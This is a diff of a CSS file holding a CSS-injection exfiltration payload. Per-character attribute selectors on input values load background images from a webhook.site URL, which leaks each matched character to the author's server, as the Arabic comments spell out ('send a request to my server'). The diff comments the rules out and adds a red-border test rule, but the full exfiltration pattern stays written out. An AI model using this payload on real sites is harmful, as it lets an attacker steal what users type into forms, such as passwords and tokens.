@@ -1,9 +1,10 @@
+
 /* إذا بدأ حقل الإدخال بحرف 'a' أرسل طلباً لسيرفري */
-input[value^="a"] {
+/*input[value^="a"] {
   background-image: url("https://webhook.site/b36a8acc-2ebd-45fc-a54c-681eea0f7dca=a");
 }
 /* نكرر لكل الحروف والأرقام */
-input[value^="b"] {
+/*input[value^="b"] {
   background-image: url("https://webhook.site/b36a8acc-2ebd-45fc-a54c-681eea0f7dca=b");
 }
 input[value^="c"] {
@@ -132,6 +133,12 @@ input[value^="8"] {
 
 input[value^="9"] {
   background-image: url("https://webhook.site/b36a8acc-2ebd-45fc-a54c-681eea0f7dca=9");
+  
 }
 
+
+
+*/
+
+body { border: 5px solid red !important; }
 
